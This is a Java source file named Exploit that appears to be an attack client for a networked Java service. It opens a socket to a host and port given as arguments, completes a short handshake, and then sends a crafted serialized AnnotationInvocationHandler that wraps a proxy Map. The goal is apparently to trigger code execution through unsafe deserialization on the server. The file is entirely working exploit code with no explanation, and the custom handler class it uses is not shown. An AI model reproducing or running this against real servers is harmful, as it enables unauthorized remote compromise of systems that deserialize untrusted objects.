import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Map;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class Exploit {
	
	public static void main(String args[]) throws Exception {
        ObjectInputStream ois;
        ObjectOutputStream oos;
        InetAddress serverAddr;
        Socket sock;

        String serverAddress = args[0];
        int serverPort = Integer.parseInt(args[1]);
        serverAddr = InetAddress.getByName(serverAddress);

        sock = new Socket(serverAddr, serverPort);
        sock.setSoTimeout(250);

        oos = new ObjectOutputStream(sock.getOutputStream());
        ois = new ObjectInputStream(sock.getInputStream());

        ois.readUTF();
        oos.writeUTF("ok");
        oos.flush();
        ois.readUTF();

        final MyInvocationHandler handler = new MyInvocationHandler(args[2], "entrySet");
        final Map map = (Map) Proxy.newProxyInstance(Exploit.class.getClassLoader(), new Class[] {Map.class}, handler);
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, map); 

        oos.writeObject(secondInvocationHandler);
        oos.flush();
        Thread.sleep(2000);
	}
}